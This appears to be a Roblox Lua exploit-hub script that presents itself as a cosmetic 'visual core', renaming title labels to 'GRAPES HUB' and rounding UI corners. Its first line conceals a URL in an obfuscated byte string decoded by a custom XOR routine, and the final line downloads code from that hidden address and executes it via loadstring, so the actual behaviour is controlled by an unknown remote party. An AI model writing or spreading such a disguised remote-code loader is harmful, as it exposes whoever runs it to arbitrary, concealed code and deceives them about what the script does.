
--[[ STAGE 2: VISUAL CORE ]]
local yi9CpTYzVsPg_3HVOKtT="\028\013\010\011\003\119\121\118\046\058\221\097\039\222\206\215\193\211\251\246\253\239\245\230\226\149\227\145\132\203\141\190\185\240\172\170\166\174\095\092\081\090\068\126\068\180\124\105\109\108\097\018\097\017\014\070\001\010\063\049\111\011\047\214\043\051\219\207\205\206\245\252\195\213\243\233\149\144\227\147\155\198\141\151\185\169\187\165\179\129\083\093\095\067\190\189\176\183\165\122\067\028\023\017\031\022\021\012\004\007\108\096\103\025\021\025\212\202\219"local kVcIXARcMyHnfg9oRMRZ=92 local eLSqdWJpqtSBUmje0c=188 local xtL7xMjoHtHyf42=1 local fRCD0Vqyy1PRxNWiW=5 local hS3eKXZPhCqAcDG7GV=23 local Lvq7KBlKJ2ZN6x=false local RnP0vYJz4V881yG9c4W_=bit32 and bit32.bxor if not RnP0vYJz4V881yG9c4W_ then RnP0vYJz4V881yG9c4W_=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local BO77JzTirl8P2F={}for vVLcw4iEIUAG=1,#yi9CpTYzVsPg_3HVOKtT do local q5iCwv1wJMWjUG=string.byte(yi9CpTYzVsPg_3HVOKtT,vVLcw4iEIUAG)local eqdeVhsei6DYeJskt=(eLSqdWJpqtSBUmje0c+(vVLcw4iEIUAG*fRCD0Vqyy1PRxNWiW)+hS3eKXZPhCqAcDG7GV)%256 if xtL7xMjoHtHyf42==0 then q5iCwv1wJMWjUG=(q5iCwv1wJMWjUG-eqdeVhsei6DYeJskt)%256 BO77JzTirl8P2F[vVLcw4iEIUAG]=string.char(RnP0vYJz4V881yG9c4W_(q5iCwv1wJMWjUG,kVcIXARcMyHnfg9oRMRZ))else q5iCwv1wJMWjUG=RnP0vYJz4V881yG9c4W_(q5iCwv1wJMWjUG,kVcIXARcMyHnfg9oRMRZ)BO77JzTirl8P2F[vVLcw4iEIUAG]=string.char((q5iCwv1wJMWjUG-eqdeVhsei6DYeJskt)%256)end end local DWtrYwWkG1YzrhO3TKWRyq=table.concat(BO77JzTirl8P2F)if Lvq7KBlKJ2ZN6x then DWtrYwWkG1YzrhO3TKWRyq=string.reverse(DWtrYwWkG1YzrhO3TKWRyq)end local LGJDefrbIsDTXn_=DWtrYwWkG1YzrhO3TKWRyq
local HubName = "GRAPES HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(LGJDefrbIsDTXn_))()
